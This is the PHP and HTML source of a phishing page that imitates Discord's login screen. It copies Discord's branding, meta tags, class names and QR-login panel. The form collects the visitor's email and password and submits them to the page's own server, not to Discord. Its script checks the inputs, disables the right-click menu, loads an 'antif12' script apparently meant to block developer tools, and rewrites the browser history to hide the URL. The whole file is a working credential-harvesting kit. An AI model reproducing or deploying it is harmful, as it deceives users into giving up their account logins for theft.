<?php 
    require("core/system/translation.php");
?>
<meta charset="utf-8">
<html lang="ru" style="font-size: 100%" class="full-motion app-focused theme-dark platform-web oldBrand" data-rh="lang,style,class">		
		<head>
			<title>Discord</title>

		    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport">
		    <meta property="og:type" content="website">
		    <meta property="og:site_name" content="Discord">
		    <meta property="og:title" content="Discord - A New Way to Chat with Friends &amp; Communities">
		    <meta property="og:description" content="Discord is the easiest way to communicate over voice, video, and text.  Chat, hang out, and stay close with your friends and communities.">
		    <meta property="og:image" content="src/img/ee7c382d9257652a88c8f7b7f22a994d.png">
		    <meta name="twitter:card" content="summary_large_image">
		    <meta name="twitter:site" content="@discord">
		    <meta name="twitter:creator" content="@discord">
		    <link rel="stylesheet" href="src/css/style.css">
		    <link rel="icon" href="src/img/847541504914fd33810e70a0ea73177e.ico">
		    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
		    <script charset="utf-8" src="src/js/62139f1cff10402837062.js"></script>
		    <script charset="utf-8" src="src/js/antif12.js"></script>
		    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
		</head>
		<body>
		    <div id="app-mount" class="appMount-3lHmkl">
		        <div class="app-1q1i1E">
		            <div class="characterBackground-2itjYF">
	                    <img style="position: fixed; height: 100%; top: 0; left: 0; width: 100%;" src="src/img/44e0c1fbcf99c4476083442e4a2774e0.svg">
	                </div>
		            <div class="splashBackground-1FRCko wrapper-3Q5DdO scrollbarGhost-2F9Zj2 scrollbar-3dvm_9">
		                <canvas class="canvas-3XuBXe" width="800" height="600" style="width: 800px; height: 600px;"></canvas>
		                <div>
		                    <div class="wrapper-6URcxg" style="opacity: 1; transform: scale(1) translateY(0px) translateZ(0px);">
		                        <div class="pole2x">
		                            <form class="authBoxExpanded-2jqaBe authBox-hW6HRx theme-dark" name="formser" method="post" onsubmit="checkpole(1); return false;">
		                                <div class="centeringWrapper-2Rs1dR">
		                                    <div class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyStart-2NDFzi alignCenter-1dQNNs noWrap-3jynv6" style="flex: 1 1 auto;">
		                                        <div class="mainLoginContainer-1ddwnR">
		                                            <h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO"><?php  print_r($alphabet[0]);?></h3>
		                                            <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf"><?php  print_r($alphabet[1]);?></div>
		                                            <div class="block-egJnc0 marginTop20-3TxNs6">
		                                                <div class="marginBottom20-32qID7">
		                                                    <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole1-text"><?php print_r($alphabet[2]);?>
		                                                        <span id="elprimo1" class="errorMessage-3Guw2R"><span class="errorSeparator-30Q6aR">-</span><?php  print_r($err ? $err : $alphabet[3]);?></span>
		                                                    </h5>
		                                                    <div class="inputWrapper-31_8H8"><input class="inputDefault-_djjkz input-cIJ7To" id="pole1" name="email" type="email" placeholder="" aria-label=<?php print_r('"'.$alphabet[2].'"');?> maxlength="999" spellcheck="false" value=""></div>
		                                                </div>
		                                                <div>
		                                                    <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole2-text"><?php  print_r($alphabet[4]);?>
		                                                        <span id="elprimo2" class="errorMessage-3Guw2R"><span class="errorSeparator-30Q6aR">-</span><?php  print_r($alphabet[3]);?></span>
		                                                    </h5>
		                                                    <div class="inputWrapper-31_8H8"><input class="inputDefault-_djjkz input-cIJ7To" id="pole2" name="password" type="password" placeholder="" aria-label="Password" maxlength="999" spellcheck="false" value=""></div>
		                                                </div>
		                                                <button type="button" class="marginBottom20-32qID7 marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
		                                                    <div class="contents-18-Yxp"><a href="https://discord.com/login" target="_self"><?php  print_r($alphabet[5]);?></a></div>
		                                                </button><button id="sade" onclick="ohmygod(); checkpole();" type="submit" class="marginBottom8-AtZOdT button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN">
		                                                	<span class="spinner-2enMB9 spinner-3a9zLT" id="loadi" style="display: none;"><span class="inner-1gJC7_ pulsingEllipsis-3YiXRF"><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span></span></span>
		                                                <div class="contents-18-Yxp"><?php  print_r($alphabet[6]);?></div>
		                                                </button>
		                                                <div class="marginTop4-2BNfKC"><span class="needAccount-23l_Wh"><?php  print_r($alphabet[7]);?></span><button type="button" class="smallRegisterLink-2LCrMe linkButton-wzh5kV button-38aScr lookLink-9FtZy- colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
		                                                        <div class="contents-18-Yxp"><a  href="https://discord.com/login" target="_self"><?php  print_r($alphabet[8]);?></a></div>
		                                                    </button></div>
		                                            </div>
		                                        </div>
		                                        <div class="verticalSeparator-3huAjp"></div>
		                                        <div class="transitionGroup-aR7y1d qrLogin-1AOZMt">
		                                            <div class="measurementFill-31KKmO measurement-DMxQp7 measurementFillStatic-MZ1pNY">
		                                                <div class="animatedNode-5VAmrN" style="overflow: visible; opacity: 1; height: 100%; transform: translateX(0%);">
		                                                    <div class="qrLoginInner-c_7ePj"><div class="qrCodeContainer-3sXarj"><div class="asi qrCode-wG6ZgU" title="https://discord.com/ra/xVaQmLO_ZnARSznjjSth2SYKx-6w98o3fL503OEXNDQ" style="padding: 8px; border-radius: 4px; background: rgb(255, 255, 255);"><canvas width="160" height="160" style="display: none;"></canvas><img alt="Scan me!" src="src/img/qrcode.png" style="display: block;"></div><div class="qrCodeOverlay-qgtlTP"><img src="src/img/092b071c3b3141a58787415450c27857.png" class= "asi" alt=""></div></div><h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO"><?php  print_r($alphabet[9]);?></h3><div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf"><?php  print_r($alphabet[10]);?><strong><?php  print_r($alphabet[11]);?></strong><?php  print_r($alphabet[12]);?></div></div>
		                                                </div>
		                                            </div>
		                                        </div>
		                                    </div>
		                                </div>
		                            </form>
		                        </div>
		                    </div>
		                </div>
		            </div>
		        </div>
				<script type="text/javascript">
					history.pushState(null, null, '/');
					
					document.oncontextmenu = () => false;
					if(document.getElementById("elprimo1").innerText != "-<?php print_r($alphabet[13]);?>" && document.getElementById("elprimo1").innerText != "-<?php print_r($alphabet[14]);?>"){
					    document.getElementById("elprimo1").hidden = true;
					}else{
						document.getElementById("pole1-text").style.color="#ed4245";
					}
					document.getElementById("elprimo2").hidden = true;
					function checkpole(w){
						let x1 = document.getElementById("pole1-text");
						let x2 = document.getElementById("pole2-text");
						let x3 = document.getElementById("formser");
						document.body.append(x3);
						let pol1 = document.querySelector("#pole1");
						let pol2 = document.querySelector("#pole2");
						let form = document.forms.formser;
						let emal = form.elements.email;
						let pass = form.elements.password;
						texsm=emal.value.trim();
						texsp=pass.value.trim();
						if(texsp==""){
							document.querySelector("#sade").classList.remove("submitting-3qlO9O");
							document.getElementById("loadi").style.display = "none";
							pol2.classList.add("unselect");
							document.getElementById("elprimo2").hidden=false;
							document.getElementById("pole2-text").style.color="#ed4245";
							document.getElementById("pole1-text").style.color="#8e9297";
							document.getElementById("elprimo1").hidden=true;
							pol1.classList.remove("unselect");
						}else{
							document.getElementById("pole2-text").style.color="#8e9297";
							document.getElementById("elprimo2").hidden=true;
							pol2.classList.remove("unselect");
							if(texsm==""){
								document.querySelector("#sade").classList.remove("submitting-3qlO9O");
								document.getElementById("loadi").style.display = "none";
								document.getElementById("pole1-text").style.color="#ed4245";
								document.getElementById("elprimo1").innerText=<?php print_r('"- '.$alphabet[3].'"');?>;
								document.getElementById("elprimo1").hidden=false;
								pol1.classList.add("unselect");
							}else{
								if(texsm.includes("@")){
									if(texsm.includes(".")){
										if (texsm.search(/[А-яЁё]/) === -1){
											x3.submit();
											document.getElementById("pole1-text").style.color="#8e9297";
											document.getElementById("elprimo1").hidden=true;
											pol1.classList.remove("unselect");
										}else{
											badgod();
										}
									}else{
										badgod();
									}
								}else{
									badgod();
								}
							}
						}
					}
					function ohmygod(){
						document.getElementById("loadi").style.display = "";
						document.querySelector("#sade").classList.add("submitting-3qlO9O");
					}
					function badgod(){
						document.querySelector("#sade").classList.remove("submitting-3qlO9O");
						document.getElementById("loadi").style.display = "none";
					}
				</script>
		</body>
	</html>